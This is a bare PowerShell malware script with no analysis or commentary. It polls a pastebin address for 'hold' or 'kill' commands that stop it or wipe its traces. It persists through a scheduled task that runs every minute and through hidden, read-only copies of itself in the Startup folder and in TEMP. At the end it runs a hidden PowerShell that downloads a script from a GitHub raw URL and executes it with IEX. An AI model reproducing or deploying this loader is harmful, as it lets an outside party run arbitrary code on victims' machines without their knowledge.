$URL = "https://pastebin.com/raw/knWXwasC"
$TempPath = "$env:TEMP\Start.vbs"
$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Start.vbs"
$LocalDir = "$env:LOCALAPPDATA\.vbs"
$LocalDir2 = "$env:LOCALAPPDATA\..vbs"

function Get-WebContent($url) {
    try {
        $webRequest = [System.Net.WebRequest]::Create($url)
        $webResponse = $webRequest.GetResponse()
        $reader = New-Object IO.StreamReader $webResponse.GetResponseStream()
        $content = $reader.ReadToEnd()
        $reader.Close()
        $webResponse.Close()
        return $content
    } catch {
        return $null
    }
}


$tunnel = Get-WebContent $URL

if ($tunnel -match "hold") {
    Exit
}

if ($tunnel -match "kill") {
    schtasks /Delete /TN "Start" /F
    attrib -r "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Start.vbs"
    attrib -h -r $TempPath
    Remove-Item $StartupPath, $TempPath, $LocalDir, $LocalDir2 -Force
    attrib -h C:\temp\Default.exe
    del C:\temp\Default.exe
    Exit
}


function task {
    param (
        [string]$TaskName,
        [string]$Command,
        [string]$Interval = "minute",
        [int]$IntervalDuration = 1
    )

    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes $IntervalDuration)
    $action = New-ScheduledTaskAction -Execute "$env:TEMP\Start.vbs"
    Register-ScheduledTask -TaskName $TaskName -Trigger $trigger -Action $action -Force
}


task -TaskName "Start" -Command "$env:TEMP\Start.vbs"


function copy {
    param (
        [string]$SourcePath,
        [string]$DestPath
    )

    $fsObject = New-Object -ComObject Scripting.FileSystemObject
    if (-Not $fsObject.FileExists($DestPath)) {
        $fsObject.CopyFile($SourcePath, $DestPath)
    }
    attrib +r "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Start.vbs"
    attrib +h +r $TempPath
}


copy -SourcePath $MyInvocation.MyCommand.Path -DestPath $StartupPath
copy -SourcePath $MyInvocation.MyCommand.Path -DestPath $TempPath


$command = "powershell -w hi -c `"IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo.ps1 -UseBasicParsing); repo $using:tunnel`""
Invoke-Expression "cmd /C $command"
